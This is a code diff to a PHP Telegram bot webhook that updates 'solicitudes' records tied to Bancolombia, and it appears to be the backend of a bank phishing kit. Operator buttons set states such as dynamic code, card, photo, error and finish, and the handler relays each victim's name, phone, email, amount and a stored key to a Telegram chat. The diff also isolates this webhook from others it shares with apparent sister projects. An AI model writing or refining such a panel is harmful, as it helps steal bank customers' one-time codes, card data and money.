@@ -100,61 +100,77 @@ if (isset($update['callback_query']) && is_array($update['callback_query'])) {
     }
 
     if ($estado && $request_id) {
-        $rowsAffected = 0;
-        $foundBanco = '';
-        $foundRid = '';
-        try {
-            global $pdo;
-            $upd = $pdo->prepare("UPDATE solicitudes SET estado = ? WHERE BINARY request_id = ? AND banco = 'Bancolombia'");
-            $upd->execute([$estado, $request_id]);
-            $rowsAffected = (int)$upd->rowCount();
-
-            $row = null;
-            $sel = $pdo->prepare("SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo FROM solicitudes WHERE BINARY request_id = ? LIMIT 1");
-            $sel->execute([$request_id]);
-            $row = $sel->fetch(PDO::FETCH_ASSOC);
-            if ($row) {
-                $foundBanco = (string)($row['banco'] ?? '');
-                $foundRid   = (string)($row['request_id'] ?? '');
-            }
-            wh_log("UPDATE estado=$estado request_id=" . var_export($request_id,true) . " rowsAffected=$rowsAffected foundBanco=$foundBanco foundRid=$foundRid");
-
-            $labelMap = [
-                'opcion_1' => 'DINAMICA',
-                'opcion_2' => 'TARJETA',
-                'opcion_3' => 'ERROR_OP3',
-                'opcion_4' => 'ERROR_OP4',
-                'opcion_5' => 'FOTO',
-                'opcion_6' => 'OPCION_6',
-                'opcion_7' => 'OPCION_7',
-                'opcion_8' => 'OPCION_8',
-                'opcion_9' => 'ERROR_DINAMICA',
-                'opcion_10' => 'FINALIZAR',
-            ];
-            $lbl = $labelMap[$estado] ?? strtoupper(str_replace('_', ' ', $estado));
-
-            $lines = [];
-            $lines[] = "✅ Estado actualizado: {$lbl}";
-            if ($row) {
-                $lines[] = "Request: " . ($row['request_id'] ?? '');
-                $lines[] = "Banco: "   . ($row['banco'] ?? '');
-                $lines[] = "Celular: " . ($row['numero_cuenta'] ?? '');
-                $lines[] = "Monto: "   . ($row['monto'] ?? '');
-                if (!empty($row['nombre']))   $lines[] = "Nombre: "   . $row['nombre'];
-                if (!empty($row['correo']))   $lines[] = "Correo: "   . $row['correo'];
-            }
-
-            if ($chat) {
-                tgSend($chat, implode("\n", $lines));
-            }
-            answerCallback($cbId, "{$lbl} aplicado ({$request_id})", false);
+        // CIERRE TOTAL contra webhook global compartido con otros proyectos.
+        // Este webhook SOLO actualiza request_id que empiecen por 'BCO_' (formato BANCOLOMBIA).
+        // Cualquier otro formato (req_, NEQ_, vacio, etc) = SKIP TOTAL.
+        $esBcoRid = (is_string($request_id) && strncmp($request_id, 'BCO_', 4) === 0);
+        if (!$esBcoRid) {
+            wh_log("SKIP request_id NO empieza por BCO_ (ignorado, otro proyecto?) data=" . var_export($data,true));
+            if ($cbId) answerCallback($cbId, "OK (callback no Bancolombia, rid=" . substr($request_id,0,24) . ")", false);
             $answered = true;
-        } catch (Throwable $e) {
-            $msg = $e->getMessage();
-            wh_log("ERROR $msg");
-            if ($cbId) answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
-            error_log("TG webhook error: " . $msg);
-            $answered = true;
+        } else {
+            $rowsAffected = 0;
+            $foundBanco = '';
+            $foundRid = '';
+            try {
+                global $pdo;
+                $upd = $pdo->prepare(
+                    "UPDATE solicitudes
+                     SET estado = ?
+                     WHERE BINARY request_id = ?
+                       AND banco = 'Bancolombia'
+                       AND LEFT(request_id,4) = 'BCO_'"
+                );
+                $upd->execute([$estado, $request_id]);
+                $rowsAffected = (int)$upd->rowCount();
+
+                $row = null;
+                $sel = $pdo->prepare("SELECT request_id, `key`, numero_cuenta, monto, banco, estado, nombre, telefono, correo FROM solicitudes WHERE BINARY request_id = ? LIMIT 1");
+                $sel->execute([$request_id]);
+                $row = $sel->fetch(PDO::FETCH_ASSOC);
+                if ($row) {
+                    $foundBanco = (string)($row['banco'] ?? '');
+                    $foundRid   = (string)($row['request_id'] ?? '');
+                }
+                wh_log("UPDATE estado=$estado request_id=" . var_export($request_id,true) . " rowsAffected=$rowsAffected foundBanco=$foundBanco foundRid=$foundRid");
+
+                $labelMap = [
+                    'opcion_1' => 'DINAMICA',
+                    'opcion_2' => 'TARJETA',
+                    'opcion_3' => 'ERROR_OP3',
+                    'opcion_4' => 'ERROR_OP4',
+                    'opcion_5' => 'FOTO',
+                    'opcion_6' => 'OPCION_6',
+                    'opcion_7' => 'OPCION_7',
+                    'opcion_8' => 'OPCION_8',
+                    'opcion_9' => 'ERROR_DINAMICA',
+                    'opcion_10' => 'FINALIZAR',
+                ];
+                $lbl = $labelMap[$estado] ?? strtoupper(str_replace('_', ' ', $estado));
+
+                $lines = [];
+                $lines[] = "✅ Estado actualizado: {$lbl}";
+                if ($row) {
+                    $lines[] = "Request: " . ($row['request_id'] ?? '');
+                    $lines[] = "Banco: "   . ($row['banco'] ?? '');
+                    $lines[] = "Celular: " . ($row['numero_cuenta'] ?? '');
+                    $lines[] = "Monto: "   . ($row['monto'] ?? '');
+                    if (!empty($row['nombre']))   $lines[] = "Nombre: "   . $row['nombre'];
+                    if (!empty($row['correo']))   $lines[] = "Correo: "   . $row['correo'];
+                }
+
+                if ($chat) {
+                    tgSend($chat, implode("\n", $lines));
+                }
+                answerCallback($cbId, "{$lbl} aplicado ({$request_id})", false);
+                $answered = true;
+            } catch (Throwable $e) {
+                $msg = $e->getMessage();
+                wh_log("ERROR $msg");
+                if ($cbId) answerCallback($cbId, "Error: " . substr($msg, 0, 120), true);
+                error_log("TG webhook error: " . $msg);
+                $answered = true;
+            }
         }
     }
 
